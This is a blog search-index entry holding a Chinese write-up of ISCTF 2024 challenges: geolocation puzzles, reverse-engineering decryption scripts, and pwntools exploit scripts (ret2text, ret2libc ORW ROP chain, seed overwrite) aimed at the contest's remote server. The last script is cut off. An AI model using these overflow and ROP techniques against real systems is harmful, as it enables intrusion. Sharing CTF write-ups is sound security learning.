<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ISCTFwp</title>
    <link href="/2024/11/16/ISCTFwp/"/>
    <url>/2024/11/16/ISCTFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="小蓝鲨的签到01"><a href="#小蓝鲨的签到01" class="headerlink" title="小蓝鲨的签到01"></a>小蓝鲨的签到01</h4><p>扫码即得flag</p><h4 id="小蓝鲨的签到02"><a href="#小蓝鲨的签到02" class="headerlink" title="小蓝鲨的签到02"></a>小蓝鲨的签到02</h4><p>strings命令查找即得flag<br><img src="/./wpsrc/misc02.png"></p><h4 id="游园地1"><a href="#游园地1" class="headerlink" title="游园地1"></a>游园地1</h4><blockquote><p>开盒题都在武汉江汉路附近，武带人狂喜</p></blockquote><p>谷歌搜图，[<a href="https://news.qq.com/rain/a/20231023A06PFW00]%E5%B0%B1%E6%9C%89%E4%B8%AA%E6%9E%81%E5%85%B6%E7%9B%B8%E4%BC%BC%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8C%E6%9F%A5%E5%BE%97%E6%AD%A4%E5%9C%B0%E4%B8%BA%E6%AD%A6%E6%B1%89%E4%B8%AD%E5%B1%B1%E5%85%AC%E5%9B%AD%E3%80%82">https://news.qq.com/rain/a/20231023A06PFW00]就有个极其相似的地方，查得此地为武汉中山公园。</a><br>故flag为ISCTF{湖北省_武汉市_江汉区_中山公园}</p><h4 id="游园地2"><a href="#游园地2" class="headerlink" title="游园地2"></a>游园地2</h4><p>继续谷歌搜图，[<a href="https://www.taptap.cn/moment/592096524821860169]%E6%9C%89%E4%B8%AA%E5%87%A0%E4%B9%8E%E4%B8%80%E6%A8%A1%E4%B8%80%E6%A0%B7%E7%9A%84%E5%9B%BE%EF%BC%8C%E7%9C%8B%E8%AF%84%E8%AE%BA%E5%8C%BA%E7%9F%A5%E9%81%93%E8%BF%99%E4%B8%AA%E6%98%AF%E3%80%90%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF%E3%80%91%E7%9A%84%E5%8E%9F%E5%9E%8B%E3%80%82">https://www.taptap.cn/moment/592096524821860169]有个几乎一模一样的图，看评论区知道这个是【充能国安路】的原型。</a><br>搜充能国安路，[<a href="https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF]%E8%BF%99%E9%87%8C%E6%90%9E%E5%87%BA%E4%BA%86%E6%B8%B8%E6%88%8F%E5%90%8D%E5%92%8C%E5%8E%9F%E5%9E%8B%E8%A1%97%E9%81%93%EF%BC%8C%E9%AB%98%E5%BE%B7%E4%B8%80%E6%90%9C%E7%AB%9F%E7%84%B6%E8%BF%98%E6%98%AF%E6%AD%A6%E6%B1%89%E6%B1%9F%E6%B1%89%E5%8C%BA%E7%9A%84%E5%9C%B0%E6%96%B9(~~%E4%BD%A0%E4%BB%AC%E4%BA%8C%E6%AC%A1%E5%85%83%E6%98%AF%E6%9C%89%E5%A4%9A%E5%96%9C%E6%AC%A2%E6%B1%9F%E6%B1%89%E8%B7%AF%E5%95%8A~~)">https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF]这里搞出了游戏名和原型街道，高德一搜竟然还是武汉江汉区的地方(~~你们二次元是有多喜欢江汉路啊~~)</a><br>得到flag:ISCTF{湖北省_武汉市_江汉区_鸣笛1988商业街_恋爱绮谭}</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="EzRe"><a href="#EzRe" class="headerlink" title="EzRe"></a>EzRe</h4><p>动调发现核心加密逻辑在这里：<br><img src="/./wpsrc/re1.png" alt="alt text"><br>又知道加密后的字符串<code>QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</code>，直接解密即可:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python">key = <span class="hljs-string">&quot;ISCTF&quot;</span><br>sercet = <span class="hljs-string">&quot;QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;&quot;</span><br>flag = []<br>j = <span class="hljs-number">0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(flag + key)%26 + &quot;A&quot; = QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sercet:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i) &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;Z&quot;</span>):<br>        flag.append(i)<br>        j+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    o = <span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(key[j%<span class="hljs-number">5</span>])<br>    <br>    o = o%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)<br>    <span class="hljs-built_in">print</span>(o)<br>    flag.append(<span class="hljs-built_in">chr</span>(o))<br>    j+=<span class="hljs-number">1</span><br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h4 id="你知道-elf文件嘛"><a href="#你知道-elf文件嘛" class="headerlink" title="你知道.elf文件嘛"></a>你知道.elf文件嘛</h4><p>拖进IDA发现竟然全是LOAD段，无从下手，干脆先随便执行一下算了……执行后发现只要按要求输入base64码表即可get flag。<br><img src="/./wpsrc/re02.png" alt="alt text"></p><h4 id="《回忆安魂曲》–第二章：当记忆被割裂"><a href="#《回忆安魂曲》–第二章：当记忆被割裂" class="headerlink" title="《回忆安魂曲》–第二章：当记忆被割裂"></a>《回忆安魂曲》–第二章：当记忆被割裂</h4><p>拖进IDA尝试F5反编译，几乎所有函数都飘红冒出JUMPOUT，显然是花指令。观察发现程序实际上是<strong>把地址加载到栈上</strong>，再利用复杂的指令进行<code>jmp rax</code>跳转。尝试nop+patch恢复似乎没什么卵用，毕竟栈帧调用及其费解，难以恢复正常。<br>做这题的是pwn手，于是在IDA调试没出什么成果的情况下果断采用pwndbg调试，终于缕清了程序逻辑：<br><img src="/./wpsrc/re3.png"><br>发现数据段上有ans和key，基本上就是<code>answer</code>和<code>key</code>了。利用pwndbg逐步审计汇编代码，发现程序的加密函数enc逻辑如下：</p><ol><li>设当前字符为<code>now</code>,索引为<code>i</code></li><li>now ^&#x3D; (0x66+i)</li><li>now ^&#x3D; 0x52</li><li>now +&#x3D; 6</li><li>now ^&#x3D; (key[i]+i)</li></ol><p>缕清了加密逻辑、找到了密文和密钥之后，解密就不难了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">ans = <span class="hljs-string">b&quot;\xea\x0c\x1a\x11\xf6\x2c\x1d\x3e\x17\x35&quot;</span> \<br>      <span class="hljs-string">b&quot;\x29\xf4\x39\x39\xd3&quot;</span> \<br>      <span class="hljs-string">b&quot;\xc3\x2d\x00\x10\x30\x3d\xcc\x00\xd3\xc0&quot;</span> \<br>      <span class="hljs-string">b&quot;\x4b\xc6\x11\xc7\x29\x3e&quot;</span> \<br>      <span class="hljs-string">b&quot;\xba\x60\x90\x34&quot;</span><br>      <br>key = <span class="hljs-string">b&quot;i_can_reverse_but_i_can_not_have_you&quot;</span><br>l = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    now = ans[i]^(key[i]+i)<br>    now -= <span class="hljs-number">6</span><br>    now ^=<span class="hljs-number">0x52</span><br>    now ^= (<span class="hljs-number">0x66</span>+i)<br>    now %=<span class="hljs-number">128</span><br>    l.append(<span class="hljs-built_in">chr</span>(now))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(l))<br></code></pre></td></tr></table></figure><h4 id="《回忆安魂曲》–第三章：逃不出的黑墙"><a href="#《回忆安魂曲》–第三章：逃不出的黑墙" class="headerlink" title="《回忆安魂曲》–第三章：逃不出的黑墙"></a>《回忆安魂曲》–第三章：逃不出的黑墙</h4><p>迷宫<del>饭</del>题，先从IDA中把迷宫提出来，再让AI写个BFS脚本查路径就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs Python">puzzle = [<br>    <span class="hljs-string">&quot;###############################P#...............#...#.......#.###&quot;</span>,<br>    <span class="hljs-string">&quot;##.###.#####.#.###.#####.#.....#...#.#.....#...#.#...#.#####.#.##&quot;</span>,<br>    <span class="hljs-string">&quot;#.#.#######.#.#.###.#C..#.#.#...#.#...#...#.#.#...#.#.#.#.#.###.#&quot;</span>,<br>    <span class="hljs-string">&quot;.#.#.###.#.#.#.#.#.#.#.#...#...#.#.......#.#.#.###.#.###.#####.##&quot;</span>,<br>    <span class="hljs-string">&quot;#######.###.#...#...#.....#.#.......#...#.#.#####.#####.#.#.#####&quot;</span>,<br>    <span class="hljs-string">&quot;.###.#...#...#...#...#...#...#.#...#.###.#.###.#.#######.#.#.#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#.#.#...#.#...#...#...#.#.###.#.#.#####.#.#.#.#######.###.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#.....#...#.#.#...#.....#.#########.#####.#.###.#.###.#.#.....#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#...#...#...#.#.#.#.#.#.#.###.#.#####.###.#.#.#...#.#...#.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#...#...#...#.#.###.###.#.#####.#.###.###.#.#...#.#.#.......#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;..#.#...#.#####.#.#######.#.#####.#.###.#...#.#.......#.#...#...#&quot;</span>,<br>    <span class="hljs-string">&quot;.#..E#.#.#.#.#######.###.#.#####.#.#.#...#.............#.....#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#.###############.#######.#.#.#.........#...#...#.....#...#.#.###&quot;</span>,<br>    <span class="hljs-string">&quot;####.#.#.#####.#.#######.#.......#...#.......#.........&quot;</span><br>]<br>puzzle = <span class="hljs-string">&quot;&quot;</span>.join(puzzle)<br>p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(puzzle), <span class="hljs-number">30</span>):<br>    p.append(<span class="hljs-built_in">list</span>(puzzle[i:i+<span class="hljs-number">30</span>]))<br>    <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-built_in">print</span>(j)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">##############################</span><br><span class="hljs-string">#P#...............#...#.......</span><br><span class="hljs-string">#.#####.###.#####.#.###.#####.</span><br><span class="hljs-string">#.....#...#.#.....#...#.#...#.</span><br><span class="hljs-string">#####.#.###.#.#######.#.#.###.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#.#.#...</span><br><span class="hljs-string">#.#.#.#.#.###.#.#.#.###.#.#.#.</span><br><span class="hljs-string">#.#.#.#.#...#...#.#.......#.#.</span><br><span class="hljs-string">#.###.#.###.#####.#########.##</span><br><span class="hljs-string">#.#...#...#.....#.#.......#...</span><br><span class="hljs-string">#.#.#####.#####.#.#.#####.###.</span><br><span class="hljs-string">#...#...#...#...#...#...#.#...</span><br><span class="hljs-string">#.###.#.###.#.#######.#.#.#.#.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#...#.#.</span><br><span class="hljs-string">###.#.#.#####.#.#.#.#######.##</span><br><span class="hljs-string">#.#...#.....#...#.#.#...#.....</span><br><span class="hljs-string">#.#########.#####.#.###.#.###.</span><br><span class="hljs-string">#.#.....#.#...#...#...#...#.#.</span><br><span class="hljs-string">#.#.#.#.#.###.#.#####.###.#.#.</span><br><span class="hljs-string">#...#.#...#.#...#...#...#...#.</span><br><span class="hljs-string">#.###.###.#.#####.#.###.###.#.</span><br><span class="hljs-string">#...#.#.#.......#.#...#.#...#.</span><br><span class="hljs-string">#####.#.#######.#.#####.#.###.</span><br><span class="hljs-string">#...#.#.......#.#...#...#.#..E</span><br><span class="hljs-string">#.#.#.#.#######.###.#.#####.#.</span><br><span class="hljs-string">#.#...#.............#.....#.#.</span><br><span class="hljs-string">#.###############.#######.#.#.</span><br><span class="hljs-string">#.........#...#...#.....#...#.</span><br><span class="hljs-string">#.#######.#.#.#####.#.#######.</span><br><span class="hljs-string">#.......#...#.......#.........</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">l, startX, startY, row, col</span>):<br>    <span class="hljs-comment"># 定义方向向量，上下左右分别为 w, s, a, d</span><br>    directions = &#123;<span class="hljs-string">&#x27;l&#x27;</span>: (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;o&#x27;</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), \<br>        <span class="hljs-string">&#x27;v&#x27;</span>: (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;e&#x27;</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)&#125;<br>    <span class="hljs-comment"># 初始化队列</span><br>    queue = deque([(startX, startY, <span class="hljs-string">&quot;&quot;</span>)])  <span class="hljs-comment"># 存储坐标和路径</span><br>    visited = <span class="hljs-built_in">set</span>((startX, startY))  <span class="hljs-comment"># 记录访问过的节点</span><br>    <br>    <span class="hljs-comment"># BFS 遍历</span><br>    <span class="hljs-keyword">while</span> queue:<br>        x, y, path = queue.popleft()<br>        <br>        <span class="hljs-comment"># 如果到达终点</span><br>        <span class="hljs-keyword">if</span> l[x][y] == <span class="hljs-string">&#x27;E&#x27;</span>:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-comment"># 遍历四个方向</span><br>        <span class="hljs-keyword">for</span> direction, (dx, dy) <span class="hljs-keyword">in</span> directions.items():<br>            nx, ny = x + dx, y + dy<br>            <br>            <span class="hljs-comment"># 检查边界和是否已访问以及是否为墙</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= nx &lt; row <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= ny &lt; \<br>                col <span class="hljs-keyword">and</span> (nx, ny) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> \<br>                    visited <span class="hljs-keyword">and</span> l[nx][ny] != <span class="hljs-string">&#x27;#&#x27;</span>:<br>                visited.add((nx, ny))<br>                queue.append((nx, ny, path + direction))<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No path found&quot;</span><br><br>    <br><span class="hljs-built_in">print</span>(solve(p, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">30</span> ,<span class="hljs-number">30</span>))<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>nc就给flag，甚至不用cat。哪怕是签到题也显得过于简单了。</p><h4 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h4><p>普通的ret2text，给了后门函数，数组索引越界。需要注意的是溢出会覆盖i，i的值必须精心布置才行；另外要ret到那个lea指令处，防止栈不对齐导致错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20162</span>)<br><br>io.sendafter(<span class="hljs-string">b&quot;first i need your team id\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">b&quot;admin\x00&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;5&quot;</span>)<br>    <br>    <br>io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;4198942&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h4><p>板子题，开了沙箱禁用<code>execve</code>，用ret2libc同款手法打orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi = <span class="hljs-number">0x4012ce</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>main = <span class="hljs-number">0x4012a1</span><br>bss = <span class="hljs-number">0x4040a0</span><br>flag = bss + <span class="hljs-number">0x100</span><br><br><span class="hljs-built_in">print</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>))<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20347</span>)<br>get_libc = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) \<br>    + p64(puts_plt) + p64(main)<br>io.sendafter(<span class="hljs-string">b&quot;oh,what&#x27;s this?\n&quot;</span>, get_libc)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x2be51</span><br>pop_rdx = libc_base + <span class="hljs-number">0x11f2e7</span><br><br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rsi) + p64(bss) + p64(read_addr)<br>payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) +\<br>     p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+ p64(open_addr)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + \<br>    p64(flag) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>)+ p64(read_addr)<br>payload += p64(pop_rdi) + p64(flag) + p64(puts_addr)<br><br>io.send(payload)<br>pause()<br>io.send(<span class="hljs-string">&quot;./flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h4><p>普通的打随机数，好处是可以栈溢出控制seed，不会有远程和本地时间差导致的错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>sh = <span class="hljs-number">0x4012fc</span><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">33258</span>)<br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;Enter your username: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">400</span> + p64(<span class="hljs-number">0</span>))<br><br>lib.srand(<span class="hljs-number">0</span>) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    res = lib.rand()<br>    <span class="hljs-keyword">if</span> res &lt; <span class="hljs-number">0</span>:<br>        res %= <span class="hljs-number">7</span><br>        res -= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        res %= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(res).encode()<br><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>    io.sendline(r())<br>    <br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h4><p>非常恶心，格串+canary绕过+ret2libc+栈迁移。首先利用格串漏洞把程序基地址、libc基地址、栈地址、canary值全部leak出来，此时main函数的canary已损坏，不过我们一会儿可以打栈迁移绕过检查，不必理会；接下来利用vuln函数里的off-by-one，覆盖rbp指向的位置的低字节，实现栈迁移，这样就可以劫持控制流重启main了。接下来就常规ret2libc打通即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span 